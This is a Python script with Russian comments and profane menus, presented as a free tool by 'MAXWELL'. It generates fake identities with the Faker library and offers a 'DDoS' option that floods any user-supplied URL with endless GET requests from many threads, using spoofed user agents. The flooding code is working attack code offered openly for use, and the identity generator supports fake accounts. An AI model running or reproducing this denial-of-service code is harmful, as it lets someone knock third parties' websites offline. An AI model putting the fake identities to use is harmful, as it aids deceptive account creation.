# IKEA - Генератор фейковых личностей BY MAXWELL
import faker
import random
import threading
import requests
from fake_useragent import UserAgent
import os
import time
import colorama
from colorama import init, Fore, Style, Back

# Настройка колорамы
init(autoreset=True)

# ASCII Art IKEA
ascii_art = """
           ______    __ __________        _      
        `MM`MM    d'  `MMMMMMMMM       dM.     
         MM MM   d'   MM             ,MMb     
         MM MM  d'    MM             d'YM.    
         MM MM d'     MM    ,       ,P `Mb    
         MM MMd'      MMMMMMM       d'  YM.   
         MM MMYM.     MM    `      ,P   `Mb   
         MM MM YM.    MM           d'    YM.  
         MM MM  YM.   MM          ,MMMMMMMMb  
         MM MM   YM.  MM          d'      YM. 
        _MM_MM_   YM._MMMMMMMMM _dM_     _dMM_
                                      

"""

class IKEA:
    def __init__(self):
        self.fake = faker.Faker()
        self.ua = UserAgent()
        self.threads = []
        self.ping_target = None 

    def generate_identity(self, gender="M"): # М или Ж
        """Генерирует фейковую личность."""
        if gender.upper() == "M":
            profile = self.fake.simple_profile(sex='M') # Мужской пол
            self.fake.name_male() #Дополнительные мужские имена
        elif gender.upper() == "F":
            profile = self.fake.simple_profile(sex='F') # Женский пол
            self.fake.name_female() #Дополнительные женские имена
        else:
            return "Ошибка: Укажите пол 'M' или 'F'."

        name = profile['name']
        username = profile['username']
        email = profile['mail']
        address = profile['address']
        birthdate = profile['birthdate'].strftime("%Y-%m-%d") # Форматируем дату

        #Добавляем немного "шведского" колорита
        if random.random() < 0.5:
            name = "Sven " + name if gender.upper() == "M" else "Astrid " + name

        identity = {
            "name": name,
            "username": username,
            "email": email,
            "address": address,
            "birthdate": birthdate,
            "user_agent": self.ua.random # Случайный User-Agent
        }
        return identity

    def print_identity(self, identity):
        """Выводит информацию о личности."""
        print(Fore.MAGENTA + "\n--- IKEA Identity ---")
        for key, value in identity.items():
            print(f"{key}: {value}")
        print("----------------------")

    def ddos_attack(self, target_url, num_threads=10): 
         """DDoS-атака."""
         print(f" DDoS-атака на {target_url} с {num_threads} потоками.")
         for _ in range(num_threads):
            t = threading.Thread(target=self._send_requests, args=(target_url,))
            self.threads.append(t)
            t.start()

    def _send_requests(self, target_url): 
        """Отправляет запросы на целевой URL ."""
        try:
            while True: #Бесконечный цикл 
                headers = {'User-Agent': self.ua.random} # Фейковый User-Agent
                response = requests.get(target_url, headers=headers) # Отправляем GET запрос
                if response.status_code == 200:
                    print(f"Запрос успешен: {target_url}")
                else:
                    print(f"Ошибка запроса: {target_url} - {response.status_code}")
        except Exception as e:
            print(f"Произошла ошибка: {e}")

    def clear_threads(self): # Очистка списка потоков
        """Очищает список активных потоков."""
        for t in self.threads:
            t.join() # Дожидаемся завершения потока
        self.threads = []
        print("Все потоки завершены.")

# --- Main ---
if __name__ == "__main__":
    while True:
        # Постепенный вывод ASCII арта
        for line in ascii_art.splitlines():
            print(Fore.BLUE + line + Style.RESET_ALL) # Выводим строку целиком с цветом
            time.sleep(0.2) # Небольшая пауза между строками (2 секунды на весь арт)

        print(Fore.LIGHTRED_EX + "-" * 27)
        print(Fore.RED + "owner: MAXWELL    price:FREE") # авторское право!
        print(Fore.LIGHTRED_EX + "-" * 27)

        ikea = IKEA()

        print(Fore.YELLOW +"\n+--- IKEA меню --------+")
        print(Fore.YELLOW + "1. ГЕНЕРАЦИЯ ЛИЧНОСТИ  |")
        print(Fore.YELLOW + "2. ДДОС                |")
        print(Fore.RED + "3. ВЫХОД" + Fore.YELLOW + "               |")
        print(Fore.YELLOW + "+----------------------+")
        choice = input("ВЫБИРАЙ СУКА: ")

        if choice == "1":
            gender = input("ВВЕДИТЕ ПОЛ ЛИЧНОСТИ (M/F): ")
            identity = ikea.generate_identity(gender)
            if isinstance(identity, str): # Обработка ошибок
                print(identity) # Вывод сообщения об ошибке
            else:
                ikea.print_identity(identity)
        elif choice == "2":
            target_url = input("ВВЕДИТЕ URL САЙТА: ")
            num_threads = int(input("ВВЕДИТЕ КОЛ-ВО ПОЖОПНИКОВ: ")) #Кол-во потоков
            ikea.ddos_attack(target_url, num_threads) #Запускаем атаку
            input("НАЖМИ ENTER ЧТО-БЫ ОСТАНОВИТЬ АТАКУ") #Останавливаем атаку
            ikea.clear_threads() #Очищаем потоки
        elif choice == "3":
           print(Fore.RED + "ПОКА БРАТОК ПОН")
           break
        elif choice == "4":
            print("Поздравляю, ты нашёл посхалку, а теперь иди нахуй")
            input("нажмите что угодно...")
        else:
            print("НЕПРАВИЛЬНЫЙ ВЫБОР, ЛОХ")

        input(Fore.GREEN + "\nНажмите Enter для перезапуска...") #Ждем нажатия Enter
        os.system('cls' if os.name == 'nt' else 'clear') #Очистка консоли
